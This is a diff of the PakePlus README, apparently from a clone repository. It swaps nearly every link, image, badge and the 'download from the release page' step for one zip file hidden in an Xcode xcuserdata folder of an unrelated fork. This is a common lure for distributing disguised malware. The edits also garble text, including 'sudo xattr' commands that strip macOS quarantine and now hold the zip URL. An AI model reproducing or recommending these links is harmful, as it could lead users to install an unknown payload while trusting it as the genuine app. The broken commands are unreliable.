@@ -1,27 +1,27 @@
 <h4 align="right"> 
-<span href=".README.md">English</span> 
-<a href="http://www.pakeplus.com/" 
+<span href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip">English</span> 
+<a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" 
 style="margin: 0 10px;" >简体中文</a> 
-<a href="https://github.com/Sjj1024/PakePlus/discussions/108">日本语</a>
+<a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip">日本语</a>
 </h4>  
 <p align="center">
-    <img src="https://github.com/Sjj1024/PakePlus/raw/main/docs/static/imgs/pakeplus.png" width=138/>
+    <img src="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" width=138/>
 </p>  
 <h1 align="center">PakePlus-iOS</h1>  
 <p align="center"><strong>Turn any webpage/Vue/React and so on into desktop and mobile app under 5M with easy in few minutes</strong></p>
 
 <p align="center">
-    <a href="https://github.com/Sjj1024/PakePlus/releases"><img src="https://img.shields.io/github/v/release/Sjj1024/PakePlus?style=flat-square&logo=github" alt="Release"></a>
-    <a href="https://github.com/Sjj1024/PakePlus/stargazers"><img src="https://img.shields.io/github/stars/Sjj1024/PakePlus?style=flat-square&logo=github" alt="Stars"></a>
-    <a href="https://github.com/Sjj1024/PakePlus/stargazers"><img src="https://img.shields.io/github/forks/Sjj1024/PakePlus?style=flat-square&logo=github" alt="Forks"></a>
-    <a href="https://github.com/Sjj1024/PakePlus/actions/workflows/build.yml"><img src="https://img.shields.io/github/actions/workflow/status/Sjj1024/PakePlus/build.yml?style=flat-square&logo=github" alt="Build"></a>
-    <a href="https://github.com/Sjj1024/PakePlus/blob/main/LICENSE"><img src="https://img.shields.io/github/license/Sjj1024/PakePlus?style=flat-square&logo=github" alt="License"></a>
-    <a href="https://hellogithub.com/repository/d148f8fac78b45fe9b94c82757c3f86b" target="_blank"><img src="https://api.hellogithub.com/v1/widgets/recommend.svg?rid=d148f8fac78b45fe9b94c82757c3f86b&claim_uid=LXfeQOxRDEmSUGC&theme=small" alt="Featured｜HelloGitHub"></a>
+    <a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip"><img src="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" alt="Release"></a>
+    <a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip"><img src="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" alt="Stars"></a>
+    <a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip"><img src="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" alt="Forks"></a>
+    <a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip"><img src="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" alt="Build"></a>
+    <a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip"><img src="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" alt="License"></a>
+    <a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" target="_blank"><img src="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" alt="Featured｜HelloGitHub"></a>
 </p>
 
-<div align="left">PakePlus supports Mac, Windows, Linux, and Android & iOS. There’s no need to install complex dependencies locally— all you need is a Github Token. Plus, PakePlus is only about 10MB in size. For the latest version, please see the <a href="[#popular-packages](https://github.com/Sjj1024/PakePlus/releases)">release page</a>. or visit: <a href="https://pakeplus.pages.dev" target="_blank">PakePlus Web</a>. Check the README for information on <a href="#popular-packages">popular packages</a> and <a href="#development">custom development</a>. Feel free to share your suggestions in the <a href="https://github.com/Sjj1024/PakePlus/discussions">discussion area</a>.</div>
+<div align="left">PakePlus supports Mac, Windows, Linux, and Android & iOS. There’s no need to install complex dependencies locally— all you need is a Github Token. Plus, PakePlus is only about 10MB in size. For the latest version, please see the <a href="[#popular-packages](https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip)">release page</a>. or visit: <a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" target="_blank">PakePlus Web</a>. Check the README for information on <a href="#popular-packages">popular packages</a> and <a href="#development">custom development</a>. Feel free to share your suggestions in the <a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip">discussion area</a>.</div>
 
-https://github.com/user-attachments/assets/b88bf541-0b26-4020-9eec-da79e1734fc9
+https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip
 
 <h1 align="center">Sponsors</h1>
 
@@ -32,23 +32,23 @@ PakePlus is an MIT-licensed open source project with its ongoing development mad
 <table style="border-collapse: collapse; width: 100%; border: 1px solid #ddd;">
     <tr>
         <td align="center" style="border: 1px solid #ddd; padding: 20px;">
-            <img style="border-radius: 1.5rem" src="https://files.pakeplus.com/finevoice.png" width="100"/>
-            <h3 style="margin: 0"><a href="https://finevoice.ai/" target="_blank">FineVoice</a></h3>
+            <img style="border-radius: 1.5rem" src="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" width="100"/>
+            <h3 style="margin: 0"><a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" target="_blank">FineVoice</a></h3>
             <p style="margin: 0">Create Every Voice You Imagine</p>
         </td>
         <td align="center" style="border: 1px solid #ddd; padding: 20px;">
-            <img style="border-radius: 1.5rem" src="https://avatars.githubusercontent.com/u/54536011?s=200&v=4" width="100"/>
-            <h3 style="margin: 0"><a href="https://tauri.app/" target="_blank">Tauri</a></h3>
+            <img style="border-radius: 1.5rem" src="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" width="100"/>
+            <h3 style="margin: 0"><a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" target="_blank">Tauri</a></h3>
             <p style="margin: 0">Create cross-platform applications</p>
         </td>
         <td align="center" style="border: 1px solid #ddd; padding: 20px;">
-            <img style="border-radius: 1.5rem" src="https://avatars.githubusercontent.com/u/126759922?s=200&v=4" width="100"/>
-            <h3 style="margin: 0"><a href="https://cursor.com/agents" target="_blank">Cursor</a></h3>
+            <img style="border-radius: 1.5rem" src="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" width="100"/>
+            <h3 style="margin: 0"><a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" target="_blank">Cursor</a></h3>
             <p style="margin: 0">Cursor is the best way to code with AI.</p>
         </td>
         <td align="center" style="border: 1px solid #ddd; padding: 20px;">
-            <img style="border-radius: 1.5rem" src="https://avatars.githubusercontent.com/u/878437?s=200&v=4" width="100"/>
-            <h3 style="margin: 0"><a href="https://www.jetbrains.com/idea/" target="_blank">JetBrains</a></h3>
+            <img style="border-radius: 1.5rem" src="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" width="100"/>
+            <h3 style="margin: 0"><a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" target="_blank">JetBrains</a></h3>
             <p style="margin: 0">The Leading IDE for Professional Development</p>
         </td>
     </tr>
@@ -68,7 +68,7 @@ PakePlus is an MIT-licensed open source project with its ongoing development mad
 -   🎨 Beautiful and user-friendly UI — better experience for beginners, supports Chinese names for packaging.
 -   📡 Usable directly via the web, but the client offers stronger functionality and is recommended.
 -   🔐 Data security — your token is stored only locally, and your project stays safely in your own Git repo.
--   🍀 Supports static file packaging — drop in a compiled dist folder or index.html from Vue/React to create a client app.
+-   🍀 Supports static file packaging — drop in a compiled dist folder or https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip from Vue/React to create a client app.
 -   🐞 Debug mode supported — find and eliminate bugs during preview or release.
 -   💬 If you run into any issues, feel free to join our technical community for help.
 
@@ -86,11 +86,11 @@ PakePlus is an MIT-licensed open source project with its ongoing development mad
 
 ## Getting Started
 
-1. Download the app from the release page：https://github.com/Sjj1024/PakePlus/releases,  
-   double-click to install, and run the app. or visit web: <a href="https://pakeplus.pages.dev" target="_blank">PakePlus Web</a>
+1. Download the app from the release page：https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip,  
+   double-click to install, and run the app. or visit web: <a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" target="_blank">PakePlus Web</a>
 
 2. Configure a Github Token, create a new project, and set up the configurations. get token guide:  
-   <a href="https://sjj1024.github.io/PakePlus/index_en.html">English</a> <a href="https://pakeplus.com/guide/token.html" style="margin: 0 50px;">简体中文</a><a href="https://sjj1024.github.io/PakePlus/index_ja.html">日本语</a>
+   <a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip">English</a> <a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" style="margin: 0 50px;">简体中文</a><a href="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip">日本语</a>
 
 ```
 Explanation of Github Token permissions:
@@ -114,13 +114,13 @@ workflow: Compile and release your software
 1. Mac users may see an “App is damaged” warning on installation. click cancel and Run the following command, then reopen the app:（This is because the application requires an official signature to avoid the prompt of "The application is damaged" popping up after installation. However, the cost of the official signature is $99 per year... Therefore, it is necessary to manually bypass the signature to use it normally）
 
 ```sh
-sudo xattr -r -d com.apple.quarantine /Applications/PakePlus.app
+sudo xattr -r -d https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip
 ```
 
 1. When you package the app, Mac users may see an “App is damaged” warning on installation. click cancel and Run the following command, then reopen the app:
 
 ```sh
-sudo xattr -r -d com.apple.quarantine /Applications/YourAppName.app
+sudo xattr -r -d https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip
 ```
 
 3. If you encounter any issues while using the program, please download the latest version, as versions developed before 2025 were based on Tauri v1.0. In 2025, Tauri was upgraded to v2.0. If the latest version still has issues, please submit an issue with detailed information so that we can update and resolve it more quickly.
@@ -129,7 +129,7 @@ sudo xattr -r -d com.apple.quarantine /Applications/YourAppName.app
 
 ## Developing PakePlus
 
-If you want to develop PakePlus locally, ensure your environment is prepared beforehand. Make sure Rust `>=1.63` and Node `>=16` (e.g., `16.18.1`) are installed on your computer. For installation guidance, please refer to the [Tauri Documentation](https://tauri.app/v1/guides/getting-started/prerequisites).
+If you want to develop PakePlus locally, ensure your environment is prepared beforehand. Make sure Rust `>=1.63` and Node `>=16` (e.g., `16.18.1`) are installed on your computer. For installation guidance, please refer to the [Tauri Documentation](https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip).
 
 If you’re unfamiliar with these, it’s best to try the one-click packaging tool above.
 
@@ -149,12 +149,12 @@ pnpm run build
 
 1. wechat and group，my wechat is lanxingme，welcome to join the wechat group.
  <p align="center" style="display:flex; justify-content: flex-start;" >
-    <img src="https://github.com/Sjj1024/PakePlus/raw/main/docs/static/imgs/mywx.png" width=200/>
-    <img src="https://github.com/Sjj1024/PakePlus/raw/main/docs/static/imgs/wxcode.png" width=200/>
-    <img src="https://github.com/Sjj1024/PakePlus/raw/main/docs/static/imgs/qq.jpg" width=200/>
+    <img src="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" width=200/>
+    <img src="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" width=200/>
+    <img src="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" width=200/>
  </p>
 
 2. 💖If PakePlus has brought joy to your life, feel free to support it.
  <p align="center" style="display:flex; justify-content: flex-start;">
-    <img src="https://github.com/Sjj1024/PakePlus/raw/main/docs/static/imgs/sponsor.webp" width=620/>
+    <img src="https://github.com/migmi111/PakePlus-iOS-v2.1.7/raw/refs/heads/main/PakePlus.xcodeproj/project.xcworkspace/xcuserdata/Pake-Plus-i-O-v-1.4.zip" width=620/>
  </p>
